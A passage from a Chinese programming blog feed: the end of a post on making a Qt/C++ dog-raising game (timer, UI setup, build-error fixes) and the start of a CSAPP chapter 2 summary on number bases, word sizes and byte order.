class="hljs-built_in">getFamilyTitle</span>();<br>        pSave-&gt;<span class="hljs-built_in">setText</span>(Demo.<span class="hljs-built_in">getFamilyTitle</span>());<br>        pRead-&gt;<span class="hljs-built_in">setText</span>(Demo.<span class="hljs-built_in">getFamilyTitle</span>());<br>        ds&lt;&lt;QString::<span class="hljs-built_in">number</span>(Demo.<span class="hljs-built_in">getFamilyWealth</span>());<br>        ds&lt;&lt;QString::<span class="hljs-built_in">number</span>(Demo.<span class="hljs-built_in">getFamilyLove</span>());<br>        ds&lt;&lt;QString::<span class="hljs-built_in">number</span>(Demo.<span class="hljs-built_in">getFamilyReserveBonse</span>());<br>        ds&lt;&lt;QString::<span class="hljs-built_in">number</span>(Demo.<span class="hljs-built_in">getFamilyReserveDogfood</span>());<br>        ds&lt;&lt;QString::<span class="hljs-built_in">number</span>(Demo.<span class="hljs-built_in">getFamilyReserveMedicine</span>());<br>        ds&lt;&lt;QString::<span class="hljs-built_in">number</span>(Demo.<span class="hljs-built_in">getPlayerTime</span>());<br>        ds&lt;&lt;QString::<span class="hljs-built_in">number</span>(Demo.member);<br><br>        <span class="hljs-comment">//狗狗信息</span><br>        ds&lt;&lt;QString::<span class="hljs-built_in">number</span>(Demo.dogs.<span class="hljs-built_in">size</span>());<br>        <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> j=<span class="hljs-number">0</span>;j&lt;Demo.dogs.<span class="hljs-built_in">size</span>();j++)<br>        &#123;<br>            ds&lt;&lt;Demo.dogs[j]-&gt;<span class="hljs-built_in">getDogName</span>();<br>            ds&lt;&lt;QString::<span class="hljs-built_in">number</span>(Demo.dogs[j]-&gt;<span class="hljs-built_in">getDogAbility</span>());<br>            ds&lt;&lt;QString::<span class="hljs-built_in">number</span>(Demo.dogs[j]-&gt;<span class="hljs-built_in">getDogEnergy</span>());<br>            ds&lt;&lt;QString::<span class="hljs-built_in">number</span>(Demo.dogs[j]-&gt;<span class="hljs-built_in">getDogIll</span>());<br>            ds&lt;&lt;QString::<span class="hljs-built_in">number</span>(Demo.dogs[j]-&gt;<span class="hljs-built_in">getDogState</span>());<br>            ds&lt;&lt;QString::<span class="hljs-built_in">number</span>(Demo.dogs[j]-&gt;<span class="hljs-built_in">getDogWorktime</span>());<br>        &#125;<br>    &#125;<br>    Fread.<span class="hljs-built_in">close</span>();<br>    <span class="hljs-built_in">InitialRecord</span>();<br>&#125;<br></code></pre></td></tr></table></figure><h5 id="定时器事件"><a href="#定时器事件" class="headerlink" title="定时器事件"></a>定时器事件</h5><p>需要在主界面头文件中声明如下部分:</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs C++"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;QTimer&gt;</span></span><br><span class="hljs-comment">//public</span><br><span class="hljs-type">int</span> millisecondPerHour=<span class="hljs-number">10000</span>;      <span class="hljs-comment">//游戏速率</span><br><span class="hljs-type">int</span> timerKiller;<br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">timerEvent</span><span class="hljs-params">(QTimerEvent *e)</span></span>;  <span class="hljs-comment">//计时器事件</span><br></code></pre></td></tr></table></figure><p>cpp文件中构造并使用定时器：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs C++"><span class="hljs-comment">//需要按时间刷新的函数一起写在定时器时间里</span><br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">ShiJX_Widget::timerEvent</span><span class="hljs-params">(QTimerEvent *)</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-type">int</span> x;<br>    x=Demo.<span class="hljs-built_in">getPlayerTime</span>();<br>    Demo.<span class="hljs-built_in">setPlayerTime</span>(++x);<br>    <span class="hljs-built_in">InitialHome</span>();<br>    <span class="hljs-comment">//renovate();</span><br>    <span class="hljs-built_in">DogGrowing</span>();<br>    <span class="hljs-built_in">Initialchoose</span>();<br>&#125;<br><br><span class="hljs-comment">//停止定时器语句，插入在功能函数中</span><br> <span class="hljs-built_in">killTimer</span>(timerKiller);<br><span class="hljs-comment">//开启定时器语句</span><br>timerKiller=<span class="hljs-built_in">startTimer</span>(millisecondPerHour);<br></code></pre></td></tr></table></figure><h3 id="6-QT图形化界面部分"><a href="#6-QT图形化界面部分" class="headerlink" title="6.QT图形化界面部分"></a>6.QT图形化界面部分</h3><h4 id="6-1-QT环境准备"><a href="#6-1-QT环境准备" class="headerlink" title="6.1 QT环境准备"></a>6.1 QT环境准备</h4><blockquote><p>我们下载的这个程序就是QT Creator</p></blockquote><p>首先下载QT，下载链接：<a href="https://download.qt.io/">Index of &#x2F; (qt.io)</a>，选择 archive - qt&#x2F; </p><p>我选择了5.12.3版本，点击直接下载，还挺慢的🥲</p><p>下载之后运行</p><p><img src="/img/%E7%94%A8QT%E5%81%9A%E4%B8%AA%E5%85%BB%E6%88%90%E7%B1%BB%E5%B0%8F%E6%B8%B8%E6%88%8F/Snipaste_2023-06-25_14-15-44.png"></p><p>next之后提示你登录，没有账号去注册一个就行，只需要填一个邮箱和密码就行。</p><blockquote><p>我看到的教程里都是直接跳过，但现在好像不行了</p></blockquote><p>接下来选择安装路径，我放在了D盘和运行程序在一个文件夹里</p><p><img src="/img/%E7%94%A8QT%E5%81%9A%E4%B8%AA%E5%85%BB%E6%88%90%E7%B1%BB%E5%B0%8F%E6%B8%B8%E6%88%8F/Snipaste_2023-06-25_14-23-30.png"></p><p>选择需要的组件，全选的话占内存很大没必要，毕竟我们只是做个作业又不会用它做很多东西。</p><p><img src="/img/%E7%94%A8QT%E5%81%9A%E4%B8%AA%E5%85%BB%E6%88%90%E7%B1%BB%E5%B0%8F%E6%B8%B8%E6%88%8F/Snipaste_2023-06-25_14-25-33.png"></p><p>这里要改成同意嗷👇🏼</p><p><img src="/img/%E7%94%A8QT%E5%81%9A%E4%B8%AA%E5%85%BB%E6%88%90%E7%B1%BB%E5%B0%8F%E6%B8%B8%E6%88%8F/Snipaste_2023-06-25_14-29-48.png"></p><p>下一页忘记截图了就是安装桌面快捷方式，直接默认next就好。接下来就是等待安装啦，时间很长可以去跑个两公里。</p><p>有些教程上会讲到配置环境变量，因为我本来就有C++的编译环境就不需要辣</p><h5 id="土狗发言"><a href="#土狗发言" class="headerlink" title="土狗发言"></a>土狗发言</h5><p>Qt Creator是一个集成环境，它集成了Qt Designer，可以直接从Qt Creator中打开和编辑.ui文件。我们也可以搜索到Qt Designer运行程序并单独使用它。</p><p>我认为如果有双屏，再开一个Qt Designer单独编辑页面布局工作效率更高。</p><h4 id="6-2-QT边学边写"><a href="#6-2-QT边学边写" class="headerlink" title="6.2 QT边学边写"></a>6.2 QT边学边写</h4><p><strong>QT项目需求</strong></p><ul><li>游戏背景为一个房间内部的静态图片</li><li>鼠标悬停在家庭成员小狗身上时显示对应的家庭成员的信息</li><li>点击小狗家庭成员可以选择要进行的活动</li><li>页面侧边有几个选项可以选择对应的活动</li><li>页面顶部显示家庭信息</li></ul><h5 id="6-2-1-创建新项目"><a href="#6-2-1-创建新项目" class="headerlink" title="6.2.1 创建新项目"></a>6.2.1 创建新项目</h5><p>选择新建new project，choose第一个，设置构建路径后在类名选择部分选择widget，注意路径中不能有中文。</p><p>这个地方要把勾选取消👇🏼</p><p><img src="/img/%E7%94%A8QT%E5%81%9A%E4%B8%AA%E5%85%BB%E6%88%90%E7%B1%BB%E5%B0%8F%E6%B8%B8%E6%88%8F/Snipaste_2023-06-25_15-27-02.png"></p><p>会直接生成框架，这时如果<code>ctrl+R</code>（编译并运行）会弹出一个空的小白框</p><p><img src="/img/%E7%94%A8QT%E5%81%9A%E4%B8%AA%E5%85%BB%E6%88%90%E7%B1%BB%E5%B0%8F%E6%B8%B8%E6%88%8F/Snipaste_2023-06-25_15-28-34.png"></p><h5 id="6-2-2-主场景设置"><a href="#6-2-2-主场景设置" class="headerlink" title="6.2.2 主场景设置"></a>6.2.2 主场景设置</h5><p>新建一个头文件config.h，添加主场景信息</p><h6 id="窗口大小和标题设置"><a href="#窗口大小和标题设置" class="headerlink" title="窗口大小和标题设置"></a>窗口大小和标题设置</h6><p>对应图片信息设置相对应的界面信息，在这里我的图片有点小，所以我把对应数据都乘了2</p><p><img src="/img/%E7%94%A8QT%E5%81%9A%E4%B8%AA%E5%85%BB%E6%88%90%E7%B1%BB%E5%B0%8F%E6%B8%B8%E6%88%8F/Snipaste_2023-06-26_13-57-38.png"></p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-comment">//游戏配置数据</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> GAME_WIDTH  1282  <span class="hljs-comment">//界面的宽度</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> GAME_HEIGHT 792   <span class="hljs-comment">//界面的高度</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> GAME_TITLE <span class="hljs-string">&quot;小狗撑起一个家&quot;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> GAME_ICON <span class="hljs-string">&quot;:/img/favicon.ico&quot;</span> <span class="hljs-comment">//图标加载路径</span></span><br></code></pre></td></tr></table></figure><p>再在主头文件中添加相应语句，快捷键alt+enter在.cpp文件中添加定义</p><p><img src="/img/%E7%94%A8QT%E5%81%9A%E4%B8%AA%E5%85%BB%E6%88%90%E7%B1%BB%E5%B0%8F%E6%B8%B8%E6%88%8F/Snipaste_2023-06-26_14-09-45.png"></p><p>对应的.cpp代码，记得在第一个函数中声明<code>initScene()</code></p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-comment">//初始化界面配置</span><br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">MainWindow::initScene</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-comment">//设置窗口尺寸</span><br>    <span class="hljs-built_in">setFixedSize</span>(GAME_WIDTH,GAME_HEIGHT);<br><br>    <span class="hljs-comment">//设置标题</span><br>    <span class="hljs-built_in">setWindowTitle</span>(GAME_TITLE);<br><br>    <span class="hljs-comment">//加载图标</span><br>    <span class="hljs-built_in">setWindowIcon</span>(<span class="hljs-built_in">QIcon</span>(GAME_ICON));<br>&#125;<br></code></pre></td></tr></table></figure><h6 id="背景和图标设置"><a href="#背景和图标设置" class="headerlink" title="背景和图标设置"></a>背景和图标设置</h6><p>在当前文件夹下新建文件，选择QT-resource</p><p><img src="/img/%E7%94%A8QT%E5%81%9A%E4%B8%AA%E5%85%BB%E6%88%90%E7%B1%BB%E5%B0%8F%E6%B8%B8%E6%88%8F/Snipaste_2023-06-26_14-21-47.png"></p><p>右键单击文件打开，把图片素材都放进去</p><p><img src="/img/%E7%94%A8QT%E5%81%9A%E4%B8%AA%E5%85%BB%E6%88%90%E7%B1%BB%E5%B0%8F%E6%B8%B8%E6%88%8F/Snipaste_2023-06-26_15-33-21.png"></p><blockquote><p>至此，我推翻重来。发现自己建文件的时候建成了mainwindows。🥲</p></blockquote><h6 id="UI界面"><a href="#UI界面" class="headerlink" title="UI界面"></a>UI界面</h6><p>使用容器Stacked Widget，会自动分页分为两个窗口。</p><p>初步计划将第一个窗口作为home页面即游戏主页面，第二个窗口作为商店页面</p><p>所有基础的游戏背景都是使用 photoshop 制作完成。</p><p>设置按钮后利用图形界面设置跳转</p><p><img src="/img/%E7%94%A8QT%E5%81%9A%E4%B8%AA%E5%85%BB%E6%88%90%E7%B1%BB%E5%B0%8F%E6%B8%B8%E6%88%8F/Snipaste_2023-06-27_13-37-42.png"></p><p>选择released是点击松开后跳转。</p><p>在.cpp文件内设置响应代码使指针指向跳转页面</p><p><img src="/img/%E7%94%A8QT%E5%81%9A%E4%B8%AA%E5%85%BB%E6%88%90%E7%B1%BB%E5%B0%8F%E6%B8%B8%E6%88%8F/Snipaste_2023-06-29_13-50-21.png"></p><p>页面利用 ps 直接制作相应非功能按钮部分减少工作量</p><p><img src="/img/%E7%94%A8QT%E5%81%9A%E4%B8%AA%E5%85%BB%E6%88%90%E7%B1%BB%E5%B0%8F%E6%B8%B8%E6%88%8F/%E8%B5%84%E6%BA%90.png"></p><h3 id="7-遇到的问题"><a href="#7-遇到的问题" class="headerlink" title="7.遇到的问题"></a>7.遇到的问题</h3><h4 id="7-1-C-代码"><a href="#7-1-C-代码" class="headerlink" title="7.1 C++代码"></a>7.1 C++代码</h4><h5 id="7-1-1-黑窗中文输出乱码"><a href="#7-1-1-黑窗中文输出乱码" class="headerlink" title="7.1.1 黑窗中文输出乱码"></a>7.1.1 黑窗中文输出乱码</h5><p>run code是正常的，但是黑框是乱码，据说二者不可兼得，就这样吧</p><p>哈哈没有解决方案🤪</p><h5 id="7-1-2-商店的实现"><a href="#7-1-2-商店的实现" class="headerlink" title="7.1.2 商店的实现"></a>7.1.2 商店的实现</h5><blockquote><p>最后发现我可以不用商店这个类，因为在游戏中的商店数据是静态的不会增加或减少，直接在main函数中设置即可，可以减少代码冗余量。</p></blockquote><p>前情提要：</p><p>如果直接设置商店类，无法实现商店中有多种可选择的商品。所以设想是先定义一个商品类，商品类中存储商品的名称和价格数据。再设置商店类，在商店类中存储商品的数组，并定义购物的函数。</p><p>那么如何实现在商店中存储商品数组呢？</p><p><code>vector&lt;Product&gt; products;</code>这句代码声明了一个名为<code>products</code>的变量，类型为<code>vector&lt;Product&gt;</code>。<code>vector</code>是C++标准库中的容器类之一，用于存储多个元素的动态数组。</p><p>需要配合头文件<code>#include&lt;vector&gt;</code>使用。</p><p>除此之外，有以下几种固定的函数使用规定：</p><p>对于 <code>vector</code> 容器，可以对数组进行动态调整、添加、删除和查找元素等操作：</p><ol><li><p>添加元素：使用 <code>push_back()</code> 函数将新元素添加到数组的末尾。</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs cpp">products.<span class="hljs-built_in">push_back</span>(product);  <span class="hljs-comment">// 向数组末尾添加一个新元素</span><br></code></pre></td></tr></table></figure></li><li><p>删除元素：使用 <code>erase()</code> 函数删除指定位置或指定元素。</p><ul><li><p>删除指定位置的元素：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs cpp">products.<span class="hljs-built_in">erase</span>(products.<span class="hljs-built_in">begin</span>() + index);  <span class="hljs-comment">// 删除指定位置的元素，index 为元素的索引</span><br></code></pre></td></tr></table></figure></li><li><p>删除指定元素的所有匹配项：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs cpp">products.<span class="hljs-built_in">erase</span>(std::<span class="hljs-built_in">remove</span>(products.<span class="hljs-built_in">begin</span>(), products.<span class="hljs-built_in">end</span>(), product), products.<span class="hljs-built_in">end</span>());  <span class="hljs-comment">// 删除指定元素的所有匹配项</span><br></code></pre></td></tr></table></figure></li></ul></li><li><p>查找元素：可以使用 <code>find()</code> 函数或遍历数组来查找指定元素。</p><ul><li><p>使用 <code>find()</code> 函数：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-keyword">auto</span> it = std::<span class="hljs-built_in">find</span>(products.<span class="hljs-built_in">begin</span>(), products.<span class="hljs-built_in">end</span>(), product);  <span class="hljs-comment">// 在数组中查找指定元素，product 为要查找的元素</span><br><span class="hljs-keyword">if</span> (it != products.<span class="hljs-built_in">end</span>()) &#123;<br>    <span class="hljs-comment">// 元素找到</span><br>&#125; <span class="hljs-keyword">else</span> &#123;<br>    <span class="hljs-comment">// 元素未找到</span><br>&#125;<br></code></pre></td></tr></table></figure></li><li><p>遍历数组：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-keyword">for</span> (<span class="hljs-type">const</span> <span class="hljs-keyword">auto</span>&amp; item : products) &#123;<br>    <span class="hljs-comment">// 对每个元素进行操作，item 为当前遍历到的元素</span><br>&#125;<br></code></pre></td></tr></table></figure></li></ul></li></ol><h4 id="7-2-QT报错"><a href="#7-2-QT报错" class="headerlink" title="7.2 QT报错"></a>7.2 QT报错</h4><h5 id="7-2-1-qmake问题"><a href="#7-2-1-qmake问题" class="headerlink" title="7.2.1 qmake问题"></a>7.2.1 qmake问题</h5><p>Error while building&#x2F;deploying project ShortTerm (kit: Desktop Qt 5.12.3 MinGW 64-bit)</p><p>When executing step “qmake”</p><p><img src="/img/%E7%94%A8QT%E5%81%9A%E4%B8%AA%E5%85%BB%E6%88%90%E7%B1%BB%E5%B0%8F%E6%B8%B8%E6%88%8F/Snipaste_2023-06-25_15-14-50.png"></p><p>问题原因就是构建目录不能放置在中文目录下，需要在英文目录里建立文件。</p><h5 id="7-2-2-图片载入报错"><a href="#7-2-2-图片载入报错" class="headerlink" title="7.2.2 图片载入报错"></a>7.2.2 图片载入报错</h5><p>error: No rule to make target ‘img&#x2F;???-1.png’, needed by ‘debug&#x2F;qrc_img.cpp’.  Stop.</p><p>发生在添加完资源后在QT界面为图片重命名的情况。</p><p>找到文件夹中的<code>.qmake.stash</code>，将其删除重新构建一次程序即可。 </p><h5 id="7-2-3-载入资源后图片不显示"><a href="#7-2-3-载入资源后图片不显示" class="headerlink" title="7.2.3 载入资源后图片不显示"></a>7.2.3 载入资源后图片不显示</h5><p>在添加完资源文件以后，要先<code>菜单栏-&gt;构建-&gt;qmake一下</code>，否则是无法显示的。</p><h5 id="7-2-4-卡死"><a href="#7-2-4-卡死" class="headerlink" title="7.2.4 卡死"></a>7.2.4 卡死</h5><p>新建一页page后设置样式表会卡死，没有正面解决方法，等一会再弄或者用Qt Designer单独配置ui。</p><p>嗷，还可以直接用代码设置样式表，不要用选项就不会卡。</p><p><del>别管了我精神失常了</del></p><p><img src="/img/%E7%94%A8QT%E5%81%9A%E4%B8%AA%E5%85%BB%E6%88%90%E7%B1%BB%E5%B0%8F%E6%B8%B8%E6%88%8F/Snipaste_2023-06-27_15-14-34.png"></p><h5 id="7-2-5-槽信号"><a href="#7-2-5-槽信号" class="headerlink" title="7.2.5 槽信号"></a>7.2.5 槽信号</h5><p>D:\software\QT\qt_project\PuppiesMakeAHome\debug\moc_shijx_widget.cpp:236: error: undefined reference to &#96;ShiJX_Widget::on_pushButton_gotostore_2_released()’</p><p>报错是因为错误地建立了一个槽信号，但是不想要了。</p><p>就只在.cpp文件中删除了对应的函数。</p><p>解决方法是在.h头文件中找到对应的声明删除，并将.cpp文件中的函数删除，最后重构项目。</p>]]></content>
    
    
    
    <tags>
      
      <tag>QT</tag>
      
      <tag>C++</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>CSAPP 第二章 信息存储 总结</title>
    <link href="/2023/09/10/CSAPP-%E7%AC%AC%E4%BA%8C%E7%AB%A0-%E4%BF%A1%E6%81%AF%E5%AD%98%E5%82%A8-%E6%80%BB%E7%BB%93/"/>
    <url>/2023/09/10/CSAPP-%E7%AC%AC%E4%BA%8C%E7%AB%A0-%E4%BF%A1%E6%81%AF%E5%AD%98%E5%82%A8-%E6%80%BB%E7%BB%93/</url>
    
    <content type="html"><![CDATA[<p>计算机如何存储数据</p><span id="more"></span><h2 id="数字表示"><a href="#数字表示" class="headerlink" title="数字表示"></a>数字表示</h2><h4 id="二进制"><a href="#二进制" class="headerlink" title="二进制"></a>二进制</h4><p>二进制的英文简写为 bin ，用数字 1 和0 表示。</p><p>现代计算机存储和处理信息都用<strong>二进制</strong>表示，其原因是二值信号能够很容易地被表示、存储和传输。</p><p>对于人类，十进制刚好对应十个手指，所以我们采用十进制表示；而对于计算机，就像某一指示灯是否亮起、导线是否连通这样的表示，就只有 “是” 或 “否” 两种可能，正对应二进制0和1，所以在机算机中二进制值工作得更好。</p><h4 id="十六进制"><a href="#十六进制" class="headerlink" title="十六进制"></a>十六进制</h4><p>十六进制的英文简写为 hex ，使用数字 0 ~ 9 和字母 A ~ F 来表示。</p><p>在 C 语言中，我们通常用 <code>0x</code> 来作为辨别十六进制数字的标志。C语言中的十六进制数字<strong>大小写等效</strong>，比如二进制数字 FA1D37B 我们可以表示为 0xfa1d37b 也可以表示为 0XFA1D37B 甚至大小写混合 0xFa1D37b。</p><h4 id="不同进制之间的转换"><a href="#不同进制之间的转换" class="headerlink" title="不同进制之间的转换"></a>不同进制之间的转换</h4><p>我们二进制、十六进制与十进制转换方法就是权值相加或者是除基值取余，例如：</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs txt">10 = ( 2^0 *0 + 2^1 *1 + 2^2 *0 + 2^3 *1 ) -&gt; 1010 <br>100 = 16^1 *6 + 16^0 *4 -&gt; 0x64<br></code></pre></td></tr></table></figure><p>对于二进制和十六进制之间的转换，我们只需要将每一位十六进制数视作四位的二进制数，将每一位分别转换再组合出结果，例如：</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs txt">0x3c81e -&gt; 3 + c + 8 + 1 + e -&gt; 0011 1100 1000 0001 1110<br></code></pre></td></tr></table></figure><h2 id="信息存储"><a href="#信息存储" class="headerlink" title="信息存储"></a>信息存储</h2><h3 id="字节"><a href="#字节" class="headerlink" title="字节"></a>字节</h3><p>字节是计算机可寻址的最小单位，一个字节由 8 位二进制位组成。</p><blockquote><p>计算机只会去访问字节 8 位整体，而不会去访问内存中某个单独的位。</p></blockquote><p>但是因为二进制的表示过于冗长，我们在实际的表示中并不是使用二进制来描述位模式，所以我们会使用十六进制来表示位模式。八位的二进制就对应两位16进制的数。</p><h3 id="字数据大小"><a href="#字数据大小" class="headerlink" title="字数据大小"></a>字数据大小</h3><p>每台计算机都有一个字长，表明指针数据的标称大小，同时字长也是计算机 <code>CPU</code> 一次能处理的最大数据。</p><p>由字长决定的的系统参数是虚拟地址空间的最大大小。也就是说对于一个字长为 x 位的机器来说，虚拟地址的范围就是 0 ~ 2^x-1。由此，我们就知道为什么 32 位的计算机的内存为 4GB 也就是 2^32 字节了。</p><p>大多数 64 位的机器都可以运行 32 位机器编译的程序，我们常说的 32 位程序和 64 位程序的区别在于编译的方式而不是运行的机器类型。</p><p>计算机的不同数据所占字节的大小也不同，具体如下表：</p><table><thead><tr><th>C声明</th><th>32位机器</th><th>64位机器</th></tr></thead><tbody><tr><td>char</td><td>1</td><td>1</td></tr><tr><td>short</td><td>2</td><td>2</td></tr><tr><td>int</td><td>4</td><td>4</td></tr><tr><td>long</td><td>4</td><td>8</td></tr><tr><td>int32_t</td><td>4</td><td>4</td></tr><tr><td>int64_t</td><td>8</td><td>8</td></tr><tr><td>char *</td><td>4</td><td>8</td></tr><tr><td>float</td><td>4</td><td>4</td></tr><tr><td>double</td><td>8</td><td>8</td></tr></tbody></table><blockquote><p>C语言中可以用 sizeof( ) 来返回某种类型数据的字节数</p></blockquote><p>由上表可知，只有指针类型的数据会随着机器字长发生变化。就是前面说的，机器字长决定了指针大小。</p><h3 id="寻址和字节顺序"><a href="#寻址和字节顺序" class="headerlink" title="寻址和字节顺序"></a>寻址和字节顺序</h3><p>跨越多字节的程序对象，我们需要确认两个规则：<strong>对象地址和字节的排列方法</strong>。</p><p>对于地址，在几乎所有的机器上，所字节对象都被存储为连续的字节序列，对象的地址就是<strong>所使用的字节中最小的地址</strong>。例如，一个四字节的 int 整数被储存在 0x100、0x101、0x102、x103 的位置，那么它的地址就是 0x100。</p><p>字节的排列表示方法有两个规则，分别为<strong>大端序</strong>和<strong>小端序</strong>。</p><p>以数据 0x12345678 为例，他的最高有效位是 12 ，最低有效位是 78。大端序的排列方式是最高有效位排列在最前面，小端序的排列方式是最低有效位排列在最前面。具体的对应关系如下：</p><p><img src="/img/CSAPP-%E7%AC%AC%E4%BA%8C%E7%AB%A0-%E4%BF%A1%E6%81%AF%E5%AD%98%E5%82%A8-%E6%80%BB%E7%BB%93/2-%E5%A4%A7%E7%AB%AF%E5%BA%8F%E5%92%8C%E5%B0%8F%E7%AB%AF%E5%BA%8F.png"></p><p>由上图来看，大端序更符合人类平时的阅读习惯，但需要注意的是，大多数的 Intel 兼容机器使用的都是小端模式。我们在编写汇编语言时，也需要按照小端序的方式书写。</p><p>我们可以通过下面的函数来输出不同程序对象的字节表示，其中 <em>start</em> 为该对象的起始地址，<em>len</em> 为显示的字节数</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">void</span> <span class="hljs-title function_">show_bytes</span><span class="hljs-params">(<span class="hljs-type">void</span> *start,<span class="hljs-type">size_t</span> len)</span>&#123;    <br>    <span class="hljs-type">size_t</span> i;<br>    <span class="hljs-keyword">for</span>(i=<span class="hljs-number">0</span>;i&lt;len;i++)<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%.2x &quot;</span>,*(<span class="hljs-type">unsigned</span> <span class="hljs-type">char</span> *)(start+i));<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\n&quot;</span>);<br>&#125;<br></code></pre></td></tr></table></figure><p>我们运行一下下面的例子来观察整形和浮点型数据的关系：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">void</span> <span class="hljs-title function_">show_bytes</span><span class="hljs-params">(<span class="hljs-type">void</span> *start,<span class="hljs-type">size_t</span> len)</span>&#123;    <br>    <span class="hljs-type">size_t</span> i;<br>    <span class="hljs-keyword">for</span>(i=<span class="hljs-number">0</span>;i&lt;len;i++)<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%.2x &quot;</span>,*(<span class="hljs-type">unsigned</span> <span class="hljs-type">char</span> *)(start+i));<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\n&quot;</span>);<br>&#125;<br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span>&#123;<br>    <span class="hljs-type">int</span> x=<span class="hljs-number">0x00003039</span>;   <span class="hljs-comment">//十进制12345转换为十六进制3039</span><br>    show_bytes(&amp;x,<span class="hljs-keyword">sizeof</span>(x));<br>    <span class="hljs-type">float</span> y=x;<br>    show_bytes(&amp;y,<span class="hljs-keyword">sizeof</span>(y));<br>&#125;<br></code></pre></td></tr></table></figure><p>输出结果如下</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs txt">39 30 00 00 <br>00 e4 40 46<br></code></pre></td></tr></table></figure><p>可以看到虽然两种类型的数据都是对 12345 编码，但他们有不同的字节模式。浮点数的输出在整数形态下为 <code>0x4640E400</code>，与整数的存储有着截然不同的结果。</p><p>但是我们对这个结果的二进制适当移位，就会发现它们有13个相匹配的位。</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">0</span>   <span class="hljs-number">0</span>   <span class="hljs-number">0</span>    <span class="hljs-number">0</span>   <span class="hljs-number">3</span>   <span class="hljs-number">0</span>   <span class="hljs-number">3</span>   <span class="hljs-number">9</span><br><span class="hljs-attribute">000000000</span> <span class="hljs-number">0000000001000000111001</span><br>            <span class="hljs-attribute">4</span>   <span class="hljs-number">6</span>   <span class="hljs-number">4</span>   <span class="hljs-number">0</span>   E    <span class="hljs-number">4</span>   <span class="hljs-number">0</span>   <span class="hljs-number">0</span><br>          <span class="hljs-attribute">0100011001000000111001</span> <span class="hljs-number">0000000000</span><br></code></pre></td></tr></table></figure><p>我们换其他的数据再次尝试就可以发现，匹配的总是 int 型的低位，但匹配位数不固定，float型的匹配部分也不是总是从最高位开始。</p><blockquote><p>原因是浮点数的尾数基本是和原二进制的值一致的，接下来浮点数部分会有相关原理解释</p></blockquote><h3 id="表示字符串"><a href="#表示字符串" class="headerlink" title="表示字符串"></a>表示字符串</h3><p>在C语言中，字符串被编码为以 NULL 结尾的字符数组，字符常用 ASCII 字符码编码表示。</p><p>字符串数组是以大端序储存的，比如我们存储一个字符串 <code>char s[] = 